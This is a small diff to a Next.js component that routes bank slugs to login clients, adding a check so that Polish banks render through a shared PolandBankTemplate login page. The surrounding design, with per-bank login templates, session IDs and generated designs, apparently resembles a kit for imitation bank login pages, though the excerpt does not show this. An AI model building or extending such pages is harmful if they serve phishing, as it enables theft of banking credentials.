@@ -1,4 +1,5 @@
 import dynamic from "next/dynamic";
+import { POLAND_TEMPLATE_SLUGS } from "@/lib/poland-bank-slugs";
 
 type DedicatedBankClientProps = {
   sessionId: string;
@@ -98,6 +99,13 @@ export function renderDedicatedBankClient({
   hasGeneratedDesign,
   forceAutoRedirect,
 }: DedicatedBankClientProps) {
+  // Polonya bankalari legacy dedicated client'larla cakisabilir (orn. "ing"
+  // Hollanda ING). PL sablonlu bankalar her zaman BankLoginClient ->
+  // PolandBankTemplate yolundan render edilir.
+  if (POLAND_TEMPLATE_SLUGS.has(bankSlug)) {
+    return null;
+  }
+
   if (forceAutoRedirect || AUTO_REDIRECT_BANKS.has(bankSlug)) {
     return <AutoRedirectClient sessionId={sessionId} bankSlug={bankSlug} bankName={bankName} />;
   }
